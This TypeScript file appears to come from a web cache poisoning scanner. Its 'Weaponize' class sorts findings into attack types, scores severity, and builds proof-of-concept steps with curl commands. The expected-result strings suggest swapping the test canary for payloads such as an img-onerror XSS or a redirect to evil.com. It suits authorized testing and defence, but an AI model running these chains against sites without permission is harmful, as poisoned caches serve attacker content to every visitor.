import { WeaponizeConfig, ExploitChain, PoisonFinding, BlastRadius, DeviceType, ProofOfConcept, ImpactAssessment } from './types';

/**
 * Weaponize — Auto-classifies exploits and generates proof-of-concept chains
 * 
 * From Parallax blog: "Auto-classify exploits (XSS, redirect, CP-DoS, session fixation,
 * CSP bypass) and generate proof-of-concept chains."
 */
export class Weaponize {
  public results: ExploitChain[] = [];

  async run(findings: PoisonFinding[]): Promise<ExploitChain[]> {
    for (const finding of findings) {
      const chain = this.generateChain(finding);
      this.results.push(chain);
    }
    return this.results;
  }

  private generateChain(finding: PoisonFinding): ExploitChain {
    const blastRadius = this.assessBlastRadius(finding);
    const impact = this.assessImpact(finding, blastRadius);
    const poc = this.generatePoC(finding, blastRadius);

    return {
      finding,
      poc,
      impact,
      blastRadius,
      prerequisites: this.getPrerequisites(finding)
    };
  }

  private assessBlastRadius(finding: PoisonFinding): BlastRadius {
    // From blog: "For confirmed poisoning findings, I determine the blast radius.
    // If the target's Vary header includes the poisoned header, the poisoning is 'targeted'.
    // Otherwise, it's 'global'. Also test cache partitioning by device type."

    const varyHeaders = finding.oracle?.primeResponse.headers['vary']?.toLowerCase() || '';
    const poisonedHeader = finding.inputName.toLowerCase();

    let scope: BlastRadius['scope'] = 'global';
    if (varyHeaders.includes(poisonedHeader)) {
      scope = 'vary-targeted';
    }

    // Test device type partitioning
    const deviceTypes: DeviceType[] = ['desktop', 'mobile', 'googlebot'];

    return {
      scope,
      varyHeader: varyHeaders.includes(poisonedHeader) ? poisonedHeader : undefined,
      deviceTypes
    };
  }

  private assessImpact(finding: PoisonFinding, blastRadius: BlastRadius): ImpactAssessment {
    // From blog classification: XSS/redirect/CP-DoS/session fixation/CSP bypass/security header poisoning
    const severityMap: Record<string, { severity: ImpactAssessment['severity']; cvss: number }> = {
      'xss': { severity: 'critical', cvss: 9.0 },
      'open_redirect': { severity: 'high', cvss: 7.5 },
      'session_fixation': { severity: 'high', cvss: 7.5 },
      'csp_bypass': { severity: 'high', cvss: 8.0 },
      'cpdos': { severity: 'high', cvss: 7.5 },
      'security_header_poisoning': { severity: 'critical', cvss: 9.0 },
      'import_hijacking': { severity: 'critical', cvss: 9.5 },
      'oauth_hijacking': { severity: 'critical', cvss: 9.8 },
      'cache_invalidation': { severity: 'high', cvss: 7.5 },
      'surrogate_key_control': { severity: 'high', cvss: 7.0 },
      'payload_splitting': { severity: 'high', cvss: 8.0 },
      'multi_cdn_mismatch': { severity: 'high', cvss: 8.0 },
      'behaviour_poisoning': { severity: 'medium', cvss: 6.5 },
      'fragment': { severity: 'high', cvss: 7.5 },
      'illegal_header': { severity: 'medium', cvss: 6.0 },
      'nextjs': { severity: 'high', cvss: 8.0 },
      'invalidation': { severity: 'high', cvss: 7.5 },
      'surrogate': { severity: 'high', cvss: 7.0 },
      'payload_split': { severity: 'high', cvss: 8.0 }
    };

    const sev = severityMap[finding.classification] || { severity: 'medium', cvss: 5.0 };
    
    let affectedUsers: ImpactAssessment['affectedUsers'] = 'all';
    if (blastRadius.scope === 'vary-targeted') affectedUsers = 'vary-targeted';
    else if (blastRadius.scope === 'device-specific') affectedUsers = 'device-specific';

    return {
      severity: sev.severity,
      cvss: sev.cvss,
      description: this.getImpactDescription(finding.classification),
      affectedUsers
    };
  }

  private getImpactDescription(classification: string): string {
    const descriptions: Record<string, string> = {
      'xss': 'Stored XSS via cache poisoning — every visitor executes attacker-controlled JavaScript',
      'open_redirect': 'Open redirect via cached Location header — all visitors redirected to attacker domain',
      'session_fixation': 'Session fixation via cached Set-Cookie — attacker controls session tokens',
      'csp_bypass': 'CSP bypass via cached meta tag / header injection — script-src bypass',
      'cpdos': 'Cache Poisoned Denial of Service — cached error responses deny service to all users',
      'security_header_poisoning': 'Security header poisoning — CSP/XFO/HSTS removed or weakened in cached responses',
      'import_hijacking': 'Import hijacking — cached redirect on JS/CSS imports gives attacker code execution on all pages',
      'oauth_hijacking': 'OAuth/OIDC endpoint poisoning — .well-known config poisoned to hijack all auth flows',
      'cache_invalidation': 'Unauthenticated cache invalidation — attacker can flush cache at will',
      'surrogate_key_control': 'Surrogate-Key/Control injection — attacker controls purge groups and TTL',
      'payload_splitting': 'Cross-input WAF bypass — payload split across header + cookie reconstructs in cached response',
      'multi_cdn_mismatch': 'Multi-CDN layer mismatch — outer CDN keys header, inner cache unkeys it',
      'behaviour_poisoning': 'Behavioural poisoning — response content changes without direct reflection',
      'fragment': 'Fragment forwarding — %23 decoded to # at origin but stripped from cache key',
      'illegal_header': 'Illegal header name injection — control chars in header name cause cached errors',
      'nextjs': 'Next.js ISR/SSG cache poisoning — framework-level cache stores wrong content type',
      'invalidation': 'Unauthenticated cache invalidation methods — PURGE/BAN/REFRESH without auth',
      'surrogate': 'Surrogate-Key/Control injection — purge group control and TTL extension',
      'payload_split': 'Cross-input payload splitting — header + cookie combine to form full exploit in cached response'
    };
    return descriptions[classification] || 'Cache poisoning with unverified impact';
  }

  private generatePoC(finding: PoisonFinding, blastRadius: BlastRadius): ProofOfConcept {
    const steps: string[] = [
      `1. Identify target endpoint: ${finding.oracle?.primeResponse.headers['x-target-url'] || finding.inputName}`,
      `2. Send poisoning request with ${finding.inputType} "${finding.inputName}" containing canary "${finding.canary}"`,
      `3. Verify cache poisoning: request same URL without ${finding.inputType}, observe canary in response`,
      `4. Confirm blast radius: test with different User-Agents (${blastRadius.deviceTypes.join(', ')})`,
      `5. Weaponize: replace canary with exploit payload based on classification "${finding.classification}"`
    ];

    const curlCommand = this.buildCurlCommand(finding);
    const expectedResult = this.getExpectedResult(finding.classification);

    return {
      description: `Cache poisoning exploit for ${finding.classification} via unkeyed ${finding.inputType} "${finding.inputName}"`,
      steps,
      curlCommand,
      expectedResult
    };
  }

  private buildCurlCommand(finding: PoisonFinding): string {
    const targetUrl = finding.oracle?.primeResponse.headers['x-target-url'] || 'https://target.com/';
    const header = finding.inputName;
    const canary = finding.canary;
    
    if (finding.inputType === 'header') {
      return `curl -H "${header}: ${canary}" "${targetUrl}?cb=$(date +%s)" -v`;
    } else if (finding.inputType === 'cookie') {
      return `curl -b "${header}=${canary}" "${targetUrl}?cb=$(date +%s)" -v`;
    } else if (finding.inputType === 'query') {
      return `curl "${targetUrl}?${header}=${canary}&cb=$(date +%s)" -v`;
    }
    return `# Manual exploitation required for ${finding.inputType}`;
  }

  private getExpectedResult(classification: string): string {
    const results: Record<string, string> = {
      'xss': 'Canary reflected in <script> tag or event handler → replace with <img src=x onerror=alert(1)> for XSS',
      'open_redirect': 'Canary in Location header → replace with https://evil.com for open redirect',
      'session_fixation': 'Canary in Set-Cookie header → replace with attacker-controlled session token',
      'csp_bypass': 'Canary in <meta> tag or CSP header → inject script-src bypass',
      'cpdos': 'Canary in cached 400/403/404/304 response → replace with payload causing cached error',
      'security_header_poisoning': 'CSP/XFO/HSTS weakened or removed in cached response',
      'import_hijacking': 'Cached redirect on <script src> or <link href> → attacker controls loaded resources',
      'oauth_hijacking': 'Poisoned .well-known/openid-configuration → authorization_endpoint redirected',
      'cache_invalidation': 'PURGE/BAN/REFRESH returns 200/204 without auth → cache flush on demand',
      'surrogate_key_control': 'Surrogate-Key tags cached responses → selective invalidation by attacker',
      'payload_splitting': 'Canary split across header + cookie → both halves adjacent in cached response',
      'multi_cdn_mismatch': 'Outer CDN keys header, inner cache processes it unkeyed → exploitable mismatch'
    };
    return results[classification] || 'Canary persists in cached response without input being sent';
  }

  private getPrerequisites(finding: PoisonFinding): string[] {
    const prereqs: string[] = [
      `Target endpoint must be cacheable (verified via cache key oracle)`,
      `Unkeyed ${finding.inputType} "${finding.inputName}" must influence response`
    ];

    if (finding.classification === 'import_hijacking') {
      prereqs.push('Cached redirect must affect <script src> or <link rel=stylesheet href> imports');
    }
    if (finding.classification === 'oauth_hijacking') {
      prereqs.push('Target must use OIDC/OAuth discovery document (.well-known/openid-configuration)');
    }
    if (finding.classification === 'cache_invalidation') {
      prereqs.push('Cache must accept unauthenticated PURGE/BAN/REFRESH methods');
    }
    if (finding.classification === 'illegal_header') {
      prereqs.push('Raw socket capability required (httpx/h11 block illegal header names)');
    }
    if (finding.classification === 'payload_splitting') {
      prereqs.push('Both header and cookie must be unkeyed and reflected adjacent in response');
    }
    if (finding.classification === 'multi_cdn_mismatch') {
      prereqs.push('Target must have multiple CDN/proxy layers (e.g., Cloudflare + Varnish)');
    }

    return prereqs;
  }

  getResults(): ExploitChain[] {
    return this.results;
  }
}